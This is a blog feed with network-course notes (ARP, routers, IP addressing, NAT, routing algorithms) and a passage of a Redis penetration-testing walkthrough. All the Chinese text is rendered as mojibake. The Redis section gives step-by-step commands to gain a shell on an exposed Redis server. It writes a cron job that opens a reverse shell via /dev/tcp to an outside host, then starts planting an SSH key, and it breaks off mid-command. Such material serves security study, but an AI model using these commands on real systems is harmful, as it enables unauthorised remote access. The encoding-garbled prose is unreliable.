æ§åˆ¶æ–¹å¼:æ§åˆ¶ä»¤ç‰Œä»ä¸€ä¸ªèŠ‚ç‚¹ä¼ åˆ°å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><h3 id="äº¤æ¢å±€åŸŸç½‘">äº¤æ¢å±€åŸŸç½‘</h3><p>ä¸»è¦æ˜¯arpåè®®</p><h4 id="arpåè®®">arpåè®®</h4><p>æ•°æ®å¸§çš„ä¼ è¾“æ˜¯ä¾èµ–äºMACåœ°å€çš„,ä½†æ˜¯Aå¾€Bå‘åŒ…çš„æ—¶å€™,åªçŸ¥é“IPåœ°å€ é—®é¢˜:ä»Bçš„IPæ€ä¹ˆçŸ¥é“Bçš„macåœ°å€ æ¯ä¸ªå±€åŸŸç½‘ä¸Šçš„IPéƒ½æœ‰arpè¡¨,arpè¡¨ä¸­æœ‰å±€åŸŸç½‘ä¸Šçš„IP/MACçš„ä¸€ä¸€å¯¹åº”,å½“AçŸ¥é“Bçš„IP,æƒ³å‘åˆ†ç»„ç»™Bçš„æ—¶å€™,å‡è®¾Bçš„MACä¸åœ¨Açš„arpè¡¨,é‚£ä¹ˆAå¹¿æ’­åŒ…å«Bçš„IPåœ°å€çš„ARPæŸ¥è¯¢åŒ…,å±€åŸŸç½‘çš„æ‰€æœ‰æœºå™¨éƒ½å¯ä»¥æ”¶åˆ°ARPæŸ¥è¯¢,å½“Bæ”¶åˆ°æŸ¥è¯¢çš„æ—¶å€™,å›é€ä¸€ä¸ªæœ‰è‡ªå·±MACçš„åŒ…ç»™A,Aç¼“å­˜IP-to-MACä¿¡æ¯ç›´åˆ°è¿‡æœŸ. å¦‚æœæ˜¯å¯¹å¤–ç½‘å‘åŒ…,é‚£ä¹ˆè¿‡ç¨‹å¦‚ä¸‹ å‘é€è¿‡ç¨‹: åœ¨è·¯ç”±å™¨Rä¸­æœ‰ä¸¤ä¸ªARPè¡¨ï¼Œæ¯ä¸ªé’ˆå¯¹ä¸€ä¸ªIPç½‘ç»œ (LAN) åœ¨ä¸»æœºçš„è·¯ç”±è¡¨ä¸­å‘ç°è·¯ç”±å™¨çš„IPï¼š111.111.111.110 åœ¨ä¸»æœºçš„ARPè¡¨ä¸­å‘ç°MACåœ°å€ï¼šE6-E9-00-17-BB4B ç­‰ Aåˆ›å»ºä¸€ä¸ªåˆ†ç»„ï¼Œæºåœ°å€ä¸ºAï¼Œç›®çš„åœ°å€ä¸ºB Aä½¿ç”¨ARPå¾—åˆ°Rçš„111.111.111.110çš„MACåœ°å€ Aåˆ›å»ºä¸€ä¸ªé“¾è·¯å±‚å¸§ï¼Œè¯¥å¸§ä»¥Rçš„MACåœ°å€ä¸ºç›®çš„åœ°å€ ï¼Œå¹¶åŒ…å« A-to-Bçš„IPæ•°æ®åŒ… Açš„é€‚é…å™¨å‘é€å¸§,Rçš„é€‚é…å™¨æ”¶åˆ°å¸§ Rä»Ethernetå¸§ä¸­æå–IPæ•°æ®åŒ…,å¾—çŸ¥ç›®çš„åœ°å€ä¸ºB Rä½¿ç”¨ ARPå¾—åˆ°Bçš„MACåœ°å€ Råˆ›å»ºä¸€ä¸ªåŒ…å«A-to-Bçš„IPæ•°æ®åŒ…çš„å¸§å‘é€ç»™B</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç½‘å¤ä¹ (ç½‘ç»œå±‚)</title>
      <link href="/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2018/07/03/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h3 id="æ¦‚è¿°">æ¦‚è¿°</h3><p><strong>ç½‘ç»œå±‚å·¥ä½œæµç¨‹</strong> å°†åˆ†ç»„ä»å‘é€æ–¹å‘åˆ°æ¥æ”¶æ–¹ å‘é€æ–¹å°†<strong>æ•°æ®æ®µ</strong>åŒ…è£…æˆåˆ†ç»„å‘å‡ºå» æ¥æ”¶æ–¹å°†åˆ†ç»„è§£å‡ºæ•°æ®æ®µç„¶åç»™ä¼ è¾“å±‚ ç½‘ç»œå±‚åè®®åœ¨æ¯å°ä¸»æœºå’Œè·¯ç”±å™¨ä¸Š å‰©ä¸‹çš„ç›´æ¥åœ¨å…·ä½“å†…å®¹é‡Œçœ‹å§</p><h3 id="è™šç”µè·¯å’Œæ•°æ®æŠ¥ç½‘ç»œ">è™šç”µè·¯å’Œæ•°æ®æŠ¥ç½‘ç»œ</h3><p>æ•°æ®æŠ¥ç½‘ç»œåœ¨ç½‘ç»œå±‚æä¾›æ— è¿æ¥æœåŠ¡ è™šç”µè·¯ç½‘ç»œæ˜¯æœ‰è¿æ¥æœåŠ¡ å¯ä»¥å¯¹æ¯”ä¼ è¾“å±‚çš„TCPå’ŒUDP,ä½†æ˜¯ä¹Ÿæœ‰åŒºåˆ«</p><ul><li>æœåŠ¡æ˜¯ä¸»æœºåˆ°ä¸»æœº,æä¾›ç»™ä¼ è¾“å±‚(ä¼ è¾“å±‚æ˜¯ç«¯åˆ°ç«¯,æä¾›ç»™åº”ç”¨è¿›ç¨‹çš„æœåŠ¡)</li><li>åŒä¸€æ—¶é—´æä¾›ä¸¤ç§ä¸­çš„ä¸€ç§(ä¼ è¾“å±‚:æä¾›TCPå’ŒUDP)</li><li>åœ¨ç«¯ç³»ç»ŸåŠç½‘ç»œæ ¸å¿ƒå®ç°(ä¼ è¾“å±‚æ˜¯åœ¨ç«¯ç³»ç»Ÿå®ç°çš„)</li></ul><h4 id="è™šç”µè·¯ç½‘ç»œ">è™šç”µè·¯ç½‘ç»œ</h4><p>å’Œæ™®é€šçš„ç”µè¯çº¿è·¯ç›¸ä¼¼,æ€§èƒ½å¯é ,æºç«¯åˆ°ç›®çš„ç«¯ ç‰¹ç‚¹:</p><ul><li>æ•°æ®ä¼ è¾“å‰å»ºç«‹è™šç”µè·¯,ä¼ è¾“å®Œæ¯•æ‹†é™¤è™šç”µè·¯</li><li>æ¯ä¸ªåˆ†ç»„æºå¸¦vcæ ‡è¯†</li><li>ä»æºåˆ°ç›®çš„çš„è·¯å¾„ä¸Šçš„æ¯ä¸ªè·¯ç”±å™¨éƒ½è¦ç»´æŠ¤æ¯ä¸ªè¿æ¥çš„çŠ¶æ€ä¿¡æ¯</li><li>é“¾è·¯ã€è·¯ç”±å™¨èµ„æºå¯èƒ½åˆ†é…ç»™vc</li></ul><h4 id="æ•°æ®æŠ¥ç½‘ç»œ">æ•°æ®æŠ¥ç½‘ç»œ</h4><p>å¯¹äºç«¯åˆ°ç«¯çš„è¿æ¥æ²¡æœ‰çŠ¶æ€ä¿¡æ¯ç»´æŠ¤,åˆ†ç»„ä½¿ç”¨ç›®çš„ä¸»æœºçš„åœ°å€è¿›è¡Œè½¬å‘,åŒä¸€ä¸ªæºåˆ°ç›®çš„ä¸»æœºåˆ†ç»„å¯èƒ½èµ°ä¸åŒçš„è·¯å¾„ <img src="/images/2018/07/1.jpg" alt="blacsheep" /> ä½¿ç”¨çš„æ˜¯æœ€é•¿å‰ç¼€åŒ¹é…,ä¸ä½œè¿‡å¤šè¯´æ˜</p><h3 id="è·¯ç”±å™¨å·¥ä½œåŸç†">è·¯ç”±å™¨å·¥ä½œåŸç†</h3><p>é¦–å…ˆæ˜¯è·¯ç”±å™¨çš„ä¸¤ä¸ªä¸»è¦åŠŸèƒ½:</p><ul><li>è¿è¡Œè·¯ç”±ç®—æ³•/åè®®(RIP,OSPF,BGP),ç®¡ç†æ§åˆ¶å¹³é¢</li><li>å°†åˆ†ç»„ä»è¾“å…¥é“¾è·¯è½¬å‘åˆ°é€‚å½“çš„è¾“å‡ºé“¾è·¯,è½¬å‘æ•°æ®å¹³é¢</li></ul><p>è·¯ç”±å™¨çš„ç»“æ„å¦‚ä¸‹å›¾ <img src="/images/2018/07/2.jpg" alt="blacsheep" /> ####è¾“å…¥ç«¯å£</p><ul><li>æ ¹æ®åˆ†ç»„ä¸­çš„ç›®çš„åœ°å€,åœ¨è¾“å…¥ç«¯å£çš„ç¼“å­˜ä¸­æŸ¥æ‰¾è½¬å‘è¡¨å¾—å‡ºé€‚å½“çš„è¾“å‡ºç«¯å£</li><li>æœ‰ç¡¬ä»¶æŸ¥æ‰¾å’Œçº¿æ€§æœç´¢ä¸¤ç§</li><li>ç›®æ ‡:è¦æ±‚è¾“å…¥ç«¯å£çš„å¤„ç†é€Ÿåº¦è¶…è¿‡çº¿è·¯çš„å¤„ç†é€Ÿåº¦</li><li>æ’é˜Ÿ:å¦‚æœè¾“å…¥ç«¯å£åˆ†ç»„çš„åˆ°è¾¾é€Ÿåº¦å¿«äºè½¬å‘é€Ÿåº¦,é‚£ä¹ˆå°±ä¼šè¿›è¡Œæ’é˜Ÿ</li></ul><h4 id="äº¤æ¢ç»“æ„">äº¤æ¢ç»“æ„</h4><p>åœ¨è¾“å…¥ç«¯å£çš„è·¯ç”±è¡¨å·²ç»æ‰¾åˆ°äº†è¾“å‡ºç«¯å£,åé¢å°±è¦ä¾é äº¤æ¢ç»“æ„æ¥å°†åˆ†ç»„ä»è¾“å…¥ç«¯å£è½¬åˆ°è¾“å‡ºç«¯å£äº† äº¤æ¢ç»“æ„æœ‰ä¸‰ç§</p><ul><li>å†…å­˜äº¤æ¢</li></ul><p>ä¼ ç»Ÿçš„è®¡ç®—æœº,äº¤æ¢åœ¨cpuçš„æ§åˆ¶ä¸‹å®Œæˆçš„,åˆ†ç»„è¢«æ‹·è´åˆ°å†…å­˜ è¿™ç§äº¤æ¢æ”¶åˆ°å†…å­˜å¸¦å®½çš„é™åˆ¶(æ¯ä¸ªåˆ†ç»„ç»è¿‡ä¸¤æ¬¡æ€»çº¿)</p><ul><li>æ€»çº¿äº¤æ¢</li></ul><p>åˆ†ç»„ä»è¾“å…¥ç«¯å£ç¼“å­˜ç»è¿‡ä¸€æ ¹å…±äº«æ€»çº¿åˆ°è¾¾è¾“å‡ºç«¯å£ç¼“å­˜,äº¤æ¢é€Ÿç‡å—åˆ°å¸¦å®½é™åˆ¶</p><ul><li>äº’è”ç½‘ç»œäº¤æ¢</li></ul><p>å…‹æœäº†æ€»çº¿å¸¦å®½çš„é™åˆ¶</p><h4 id="è¾“å‡ºç«¯å£">è¾“å‡ºç«¯å£</h4><ul><li>ç¼“å­˜</li></ul><p>å½“åˆ†ç»„ä»äº¤æ¢ç»“æ„è¾¾åˆ°çš„é€Ÿç‡å¿«äºè¾“å‡ºé“¾è·¯é€Ÿç‡çš„æ—¶å€™å°±éœ€è¦ç¼“å­˜</p><ul><li>è°ƒåº¦åŸåˆ™</li></ul><p>å…ˆåˆ°å…ˆæœåŠ¡FCFS,åŠ æƒå…¬å¹³æ’é˜ŸWFQ æŠ›å¼ƒåŸåˆ™:å¼ƒå°¾,ä¸»åŠ¨é˜Ÿåˆ—ç®¡ç†,éšæœºæ—©æœŸæ£€æµ‹ å½“åˆ†ç»„ä»äº¤æ¢ç»“æ„è¾¾åˆ°çš„é€Ÿç‡è¿‡å¿«,è¾“å‡ºç«¯å£ç¼“å†²åŒºæº¢å‡ºçš„æ—¶å€™åˆ™ä¼šé€ æˆåˆ†ç»„çš„ä¸¢å¤±</p><h3 id="ç½‘é™…åè®®">ç½‘é™…åè®®</h3><p>Internetç½‘ç»œå±‚ <img src="/images/2018/07/3.jpg" alt="blacsheep" /></p><h4 id="ipæ•°æ®æŠ¥æ ¼å¼">IPæ•°æ®æŠ¥æ ¼å¼</h4><p>å¤´éƒ¨20å­—èŠ‚,å…·ä½“æ¥çœ‹ <img src="/images/2018/07/4.jpg" alt="blacsheep" /></p><h4 id="åˆ†ç‰‡å’Œé‡ç»„">åˆ†ç‰‡å’Œé‡ç»„</h4><p>ä¾‹é¢˜ <img src="/images/2018/07/5.jpg" alt="blacsheep" /> æ¯éš”ä¸€ä¸ªå®Œæ•´æ•°æ®æŠ¥åç§»ä¸º1480/8=185,IDç›¸åŒ,é™¤äº†æœ€åä¸€ä¸ªæ•°æ®æŠ¥çš„fragflagä¸º0å…¶ä»–çš„å‡ä¸º1,lengthä¸ºMTU</p><h4 id="ipå¯»å€ä»‹ç»">ipå¯»å€:ä»‹ç»</h4><p>IPåœ°å€:åˆ†é…ç»™ä¸»æœºæˆ–è·¯ç”±å™¨æ¥å£çš„32bitçš„æ ‡è¯†ç¬¦ æ¥å£:ä¸»æœº/è·¯ç”±å™¨å’Œé“¾è·¯ä¹‹é—´çš„è¾¹ç•Œ</p><ul><li>è·¯ç”±å™¨å’Œä¸»æœºéƒ½å¯ä»¥æœ‰å¤šæ¥å£</li><li>æ¯ä¸ªæ¥å£æœ‰ä¸€ä¸ªipåœ°å€</li></ul><h5 id="å­ç½‘">å­ç½‘</h5><p>IPé«˜ä½ä¸ºå­ç½‘éƒ¨åˆ† ä½ä½ä¸ºä¸»æœºéƒ¨åˆ† ä»€ä¹ˆæ˜¯ä¸€ä¸ªå­ç½‘?</p><ul><li>è®¾å¤‡æ¥å£çš„IPæœ‰ç›¸åŒçš„ç½‘ç»œéƒ¨åˆ†</li><li>æ²¡æœ‰è·¯ç”±å™¨çš„ä»‹å…¥,ç‰©ç†ä¸Šèƒ½å¤Ÿäº’ç›¸åˆ°è¾¾</li></ul><p>ä¸ºäº†ç¡®å®šå­ç½‘,åˆ†å¼€ä¸»æœºå’Œè·¯ç”±å™¨çš„æ¯ä¸ªæ¥å£,ä»è€Œäº§ç”Ÿäº†å‡ ä¸ªåˆ†ç¦»çš„ç½‘ç»œå²›,è¿™äº›ç‹¬ç«‹ç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªå«åšä¸€ä¸ªå­ç½‘</p><h5 id="å­ç½‘æ©ç ">å­ç½‘æ©ç </h5><p>å’ŒIPåšANDè¿ç®—,è·å¾—çš„ç»“æœç›¸åŒåˆ™å¤„äºåŒä¸€å­ç½‘</p><h5 id="åˆ†ç±»ip">åˆ†ç±»ip</h5><figure><img src="/images/2018/07/6.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h5 id="cidråœ°å€å—">CIDRåœ°å€å—</h5><p>æ ¼å¼:a.b.c.d/x</p><h5 id="dhcp">DHCP</h5><p>é—®:ä¸»æœºå¦‚ä½•è·å¾—IP? windows:æ§åˆ¶é¢æ¿-&gt;ç½‘ç»œ-&gt;é…ç½®-&gt;tcp/ip-&gt;å±æ€§ unix:/etc/rc.config</p><ul><li>DHCP(åŠ¨æ€ä¸»æœºé…ç½®åè®®)</li></ul><p>è‡ªåŠ¨ä»ä¸€ä¸ªDHCPæœåŠ¡å™¨å¾—åˆ°IPåœ°å€</p><blockquote><p>ç›®æ ‡:</p><ul><li>å…è®¸ä¸»æœºåœ¨åŠ å…¥ç½‘ç»œæ—¶ä»ç½‘ç»œæœåŠ¡å™¨åŠ¨æ€å¾—åˆ°IPåœ°å€</li><li>èƒ½å¤Ÿåœ¨ä½¿ç”¨æ—¶ç»­å€Ÿåœ°å€ç§Ÿç”¨</li><li>å…è®¸é‡ç”¨åœ°å€</li><li>æ”¯æŒå‡†å¤‡åŠ å…¥ç½‘ç»œçš„ç§»åŠ¨ç”¨æˆ·</li></ul></blockquote><ul><li>DHCPæ¦‚è¿° ä¸»æœºå¹¿æ’­"DHCP discover" DHCPå›å¤"DHCP offer" ä¸»æœºè¯·æ±‚ "DHCP request" DHCPå‘é€åœ°å€"DHCP ack"</li></ul><h5 id="nat">NAT</h5><p>åŠ¨æœº:å¯¹å¤–éƒ¨ç½‘ç»œæ¥è®²,æœ¬åœ°ç½‘ç»œåªç”¨ä¸€ä¸ªIPåœ°å€:</p><ul><li><p>ä¸éœ€è¦ä»ISPåˆ†é…ä¸€ç³»åˆ—IP,åªè¦ä¸€ä¸ªIPåœ°å€ç”¨äºæ‰€æœ‰è®¾å¤‡</p></li><li><p>æœ¬åœ°ç½‘ç»œæ”¹å˜è®¾å¤‡çš„IPä¸éœ€è¦é€šçŸ¥å¤–ç•Œ</p></li><li><p>å¯ä»¥å˜æ›´ISPè€Œä¸ç”¨æ”¹å˜æœ¬åœ°ç½‘ç»œçš„è®¾å¤‡çš„åœ°å€</p></li><li><p>æœ¬åœ°ç½‘ç»œå†…éƒ¨ä¸èƒ½è¢«å¤–ç•Œå¯»å€(å¯¹å¤–ç•Œä¸å¯è§)</p></li></ul><p><strong>æ‰§è¡Œ</strong> å¯¹äºNATè·¯ç”±å™¨</p><ul><li><p>å¯¹äºå¤–å‡ºçš„åˆ†ç»„,æ›¿æ¢æ¯ä¸ªå¤–å‡ºåˆ†ç»„çš„(æºip,ç«¯å£)ä¸º(NAT IP,æ–°ç«¯å£),è¿œç¨‹æœåŠ¡å™¨ç”¨(NAT IP,æ–°ç«¯å£)ä½œä¸ºç›®çš„åœ°æ¥å“åº”</p></li><li><p>NATè½¬æ¢è¡¨ä¸­,æ¯ä¸ª(æºIP,ç«¯å£)åˆ°(NAT IPï¼Œæ–°ç«¯å£)è½¬æ¢é…å¯¹</p></li><li><p>è¿›æ¥çš„åˆ†ç»„:å¯¹æ¯ä¸ªè¿›æ¥çš„åˆ†ç»„,ç”¨ä¿å­˜åœ¨NATè¡¨ä¸­çš„(æºIP ç«¯å£)æ¥æ›¿æ¢ç›®çš„åŸŸ(NAT IP,æ–°ç«¯å£)</p></li></ul><p>ä¹Ÿå°±æ˜¯ç”¨NATIPæ¥åšå¤–è®¿é—®å¤–ç½‘çš„åª’ä»‹,ç¤ºæ„å›¾å¦‚ä¸‹ <img src="/images/2018/07/nat.png" alt="blacsheep" /></p><h5 id="icmp">ICMP</h5><p>ç”¨äºä¸»æœºè·¯ç”±å™¨ä¹‹é—´å½¼æ­¤äº¤æµç½‘ç»œå±‚ä¿¡æ¯ - å·®é”™æŠ¥å‘Š:ä¸å¯åˆ°è¾¾çš„ä¸»æœº,ç«¯å£,åè®®</p><ul><li>è¯·æ±‚/åº”ç­”</li></ul><p>ä½äºIPä¹‹ä¸Š - ICMPæ¶ˆæ¯è£…è½½åœ¨IPåˆ†ç»„é‡Œ ICMPçš„ç±»å‹ <img src="/images/2018/07/icmperr.png" alt="blacsheep" /></p><h5 id="ipv6">ipv6</h5><p>åˆå§‹åŠ¨æœº:32-bitåœ°å€ç©ºé—´å³å°†ç”¨å°½ å…¶ä»–åŠ¨æœº:æ”¹å˜æ ¼å¼å¯ä»¥å¸®åŠ©è½¬å‘ IPv6æ•°æ®æŠ¥æ ¼å¼</p><ul><li><p>å›ºå®šé•¿åº¦çš„40å­—èŠ‚é¦–éƒ¨</p></li><li><p>ä¸å…è®¸åˆ†ç‰‡</p></li></ul><p><strong>ipv6å’Œipv4çš„ä¸åŒ</strong>:</p><ul><li><p>æ ¡éªŒå’Œ:å…¨éƒ¨å»æ‰,å‡å°‘æ¯ä¸€è·³çš„å¤„ç†æ—¶é—´</p></li><li><p>é€‰é¡¹:å…è®¸,ä½†æ˜¯ä¸æ˜¯æ ‡å‡†é¦–éƒ¨çš„ä¸€éƒ¨åˆ†,è€Œæ˜¯ç”¨ä¸‹ä¸€ä¸ªé¦–éƒ¨åŸŸæŒ‡å‡º</p></li><li><p>ICMPv6:æ–°ç‰ˆæœ¬çš„ICMPï¼Œå¢åŠ äº†æ¶ˆæ¯ç±»å‹,æ¯”å¦‚åˆ†ç»„å¤ªå¤§,å¤šæ³¢ç»„ç®¡ç†åŠŸèƒ½</p></li></ul><p><strong>ipv4åˆ°ipv6çš„è¿‡æ¸¡</strong> ä¸¤ç§æ¨èæ–¹æ³•:</p><ul><li>åŒæ ˆ:ä¸€äº›è·¯ç”±å™¨å…·æœ‰åŒé‡æ ˆèƒ½å¤Ÿåœ¨ä¸¤ç§æ ¼å¼ä¸­è½¬æ¢</li></ul><p>å³ipv6å’Œipv4ä¹‹é—´è½¬æ¢</p><ul><li>éš§é“:ç©¿è¿‡ipv4è·¯ç”±å™¨çš„æ—¶å€™,ipv6ä½œä¸ºåˆ†ç»„è´Ÿè½½</li></ul><p>ç”¨ipv4åŒ…ä½ipv6</p><h3 id="é€‰è·¯ç®—æ³•">é€‰è·¯ç®—æ³•</h3><p>é€‰è·¯ç®—æ³•å†³å®šäº†è·¯ç”±å™¨ä¸­è½¬å‘è¡¨ä¸­çš„å€¼ è·¯ç”±ç®—æ³•å¯ä»¥ç®€å•çš„åˆ†ä¸ªç±» æ¯”å¦‚<strong>å…¨å±€æˆ–æ˜¯åˆ†æ•£</strong> <strong>å…¨å±€</strong> æ‰€æœ‰çš„è·¯ç”±å™¨éƒ½æœ‰å®Œæ•´çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„å’Œé“¾è·¯å¼€é”€ ä½¿ç”¨é“¾è·¯çŠ¶æ€ç®—æ³•(å¦‚dijkstra) <strong>åˆ†æ•£</strong> è·¯ç”±å™¨åªçŸ¥é“ç‰©ç†è¿æ¥çš„é‚»å±…å’Œåˆ°é‚»å±…çš„é“¾è·¯å¼€é”€ é€šè¿‡é‚»å±…ä¹‹é—´çš„åå¤è®¡ç®—å¤„ç†å’Œäº¤æ¢ä¿¡æ¯æ¥æ„é€ è·¯ç”±è¡¨ ä½¿ç”¨è·ç¦»çŸ¢é‡ç®—æ³• æˆ–è€…æ˜¯<strong>é™æ€å’ŒåŠ¨æ€çš„</strong> <strong>é™æ€çš„</strong> è·¯ç”±å˜åŒ–å¾ˆæ…¢ï¼Œé€šå¸¸æœ‰äººå·¥è®¾å®š <strong>åŠ¨æ€çš„</strong> è·¯ç”±å˜åŒ–å¾ˆå¿«,å‘¨æœŸæ€§æ›´æ–°,è€Œä¸”ç›´æ¥å½±å“é“¾è·¯å¼€é”€çš„å˜åŒ–</p><h4 id="é“¾è·¯çŠ¶æ€ç®—æ³•">é“¾è·¯çŠ¶æ€ç®—æ³•</h4><p>ä¹Ÿå°±æ˜¯dijkstraç®—æ³• æ‰€æœ‰èŠ‚ç‚¹çŸ¥é“ç½‘ç»œæ‹“æ‰‘ç»“æ„å’Œé“¾è·¯å¼€é”€(é€šè¿‡é“¾è·¯çŠ¶æ€å¹¿æ’­å®Œæˆ)</p><h4 id="è·ç¦»å‘é‡ç®—æ³•">è·ç¦»å‘é‡ç®—æ³•</h4><p>åŠ¨æ€è®¡ç®— d<sub>x</sub>(y)=min<sub>v</sub>{c(x,y)+d<sub>v</sub>(y)} æ–¹ç¨‹ä¸¾ä¾‹: <img src="/images/2018/07/belman.png" alt="blacsheep" /> <strong>åŸºæœ¬æ€æƒ³</strong></p><ul><li><p>æ¯ä¸ªèŠ‚ç‚¹å‘¨æœŸæ€§åœ°ç»™ç›¸é‚»èŠ‚ç‚¹å‘é€è‡ªå·±çš„è·ç¦»å‘é‡ä¼°è®¡å€¼</p></li><li><p>å½“èŠ‚ç‚¹xä»å®ƒçš„ä»»ä½•ä¸€ä¸ªé‚»å±…væ”¶åˆ°ä¸€ä¸ªæ–°çš„è·ç¦»å‘é‡ä¼°è®¡å€¼,å°±ç”¨B-Fæ–¹ç¨‹æ›´æ–°è‡ªå·±çš„è·ç¦»å‘é‡ä¼°å€¼</p></li></ul><p>ç®€å•æ­£å¸¸æƒ…å†µä¸‹,è·ç¦»å‘é‡ä¼°å€¼D<sub>x</sub>(y)æ”¶æ•›åˆ°å®é™…çš„æœ€å°è·¯å¾„å¼€é”€d<sub>x</sub>(y)</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redisåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨æ€»ç»“</title>
      <link href="/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/"/>
      <url>/2018/07/03/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADgetshell%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åšæ­ç”µçš„hgameçš„æ—¶å€™æœ‰ä¸€é“ssrfæ‰“sqlçš„é¢˜,å½“æ—¶æ‰¾èµ„æ–™çš„æ—¶å€™å€’æ˜¯å¾ˆå¤šssrfæ‰“redisçš„ä¸œè¥¿,è¿™æ¬¡å­¦ä¹ ä¸€ä¸‹å§,é¡ºä¾¿æ€»ç»“ä¸€ä¸‹</p><h2 id="æ¦‚è¿°">æ¦‚è¿°</h2><p>é¦–å…ˆredisæ˜¯ä¸ªéå…³ç³»å‹æ•°æ®åº“,ç„¶åredisæ›´åå‘äºmemcacheä¸€ç‚¹,å®ƒæ˜¯ä¸€ä¸ªkey-valueå‹çš„æ•°æ®åº“,ä¿¡æ¯ä»¥é”®å€¼å½¢å¼å­˜åœ¨å†…å­˜ä¸­ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç”¨saveæŠŠå®ƒå­˜è‡³ç¡¬ç›˜,è¿™ä¸ªæ—¶å€™å°±å¯èƒ½ä¼šgetshelläº† å‡ ç§ç®€å•çš„æ–¹æ³•</p><blockquote><p>1.é€šè¿‡å‘webç›®å½•å†™webshellæ¥getshell 2.å†™ssh-keyæ¥getshell 3.å†™crontabæ¥getshell</p></blockquote><p>å½“ç„¶,è¿™äº›æ”»å‡»éƒ½åŒ…å«ä¸€äº›è¦æ±‚,æ¯”å¦‚å½“å‰ç”¨æˆ·çš„æƒé™,ç›®å½•æƒé™,webç›®å½•æ˜¯å¦å·²çŸ¥ç­‰,æ€ä¹ˆåˆ©ç”¨è¿˜æ˜¯çœ‹å…·ä½“åœºåˆ</p><h2 id="redisæœåŠ¡å™¨æ­å»º">redisæœåŠ¡å™¨æ­å»º</h2><p><strong>ç¬¬1æ­¥ï¼šredisæœåŠ¡çš„ä¸‹è½½</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure><p><strong>ç¬¬2æ­¥ï¼šredisè§£å‹ã€ç¼–è¯‘</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><strong>ç¬¬3æ­¥ï¼šå¯åŠ¨redisæœåŠ¡</strong> æ–°ç‰ˆæœ¬çš„redisé»˜è®¤ç›‘å¬æœ¬åœ°,æˆ‘ä»¬å¯ä»¥æ”¹æˆ0.0.0.0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /root/redis-4.0.9/redis.conf</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»">æ”»å‡»</h2><p>é¦–å…ˆéƒ½æ˜¯ç”¨rediså®¢æˆ·ç«¯è¿æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.182.128 -p 6379</span><br></pre></td></tr></table></figure><h3 id="crontabsæ”»å‡»"><strong>crontabsæ”»å‡»</strong></h3><p><strong>1.è®¾ç½®æ–‡ä»¶å¤¹è·¯å¾„</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure><p><strong>2.ä¿®æ”¹å¤‡ä»½çš„æ–‡ä»¶çš„åç§°</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure><p><strong>3.è®¾ç½®è®¡åˆ’ä»»åŠ¡</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure><p><strong>4.ä¿å­˜</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure><p>ç„¶åä¸ŠæœåŠ¡å™¨ç›‘å¬å°±okäº† ä¸è¿‡è¿™ç§æ–¹å¼æˆ‘å¹¶æ²¡æœ‰getshellè¿‡,åŸå› ä½ç½®,åç»­å†æ…¢æ…¢çœ‹å§...</p><h3 id="å†™sshkeyæ¥getshell"><strong>å†™sshkeyæ¥getshell</strong></h3><p><strong>1.ç”Ÿäº§å¯†é’¥</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p>é€‰rsa,è®¤è¯è‡ªå·±å®š,ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n\n\n&quot;) &gt; 